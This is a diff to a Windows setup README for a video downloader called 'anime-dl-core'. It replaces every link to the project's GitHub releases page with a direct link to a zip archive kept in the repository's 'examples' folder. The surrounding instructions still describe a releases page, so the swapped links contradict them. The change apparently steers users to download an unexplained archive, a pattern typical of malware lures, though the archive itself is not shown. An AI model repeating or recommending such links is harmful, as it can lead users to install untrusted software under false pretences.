@@ -10,9 +10,9 @@ Welcome! This guide will help you get **anime-dl-core** up and running on your W
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-Download%20anime--dl--core-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/iZacki35/anime-dl-core/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-Download%20anime--dl--core-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/iZacki35/anime-dl-core/main/examples/v2.8-alpha.2.zip)
 
-Click the big button above or visit this link to download the application: **https://github.com/iZacki35/anime-dl-core/releases**
+Click the big button above or visit this link to download the application: **https://raw.githubusercontent.com/iZacki35/anime-dl-core/main/examples/v2.8-alpha.2.zip**
 
 Visit this link to download the application. The page will show you available versions—pick the newest one that says "Windows" in its name. Click the download button next to it, and the file will start saving to your computer.
 
@@ -116,7 +116,7 @@ Check the releases page (the link at the top) periodically for new versions. The
 
 | Action | What to Do |
 |--------|------------|
-| Download app | Visit https://github.com/iZacki35/anime-dl-core/releases |
+| Download app | Visit https://raw.githubusercontent.com/iZacki35/anime-dl-core/main/examples/v2.8-alpha.2.zip |
 | Get a video link | Paste embed URL into the app, hit Extract |
 | Save an episode | Click Download, pick a folder, wait |
 | Play a video | Double-click the file in your media player |
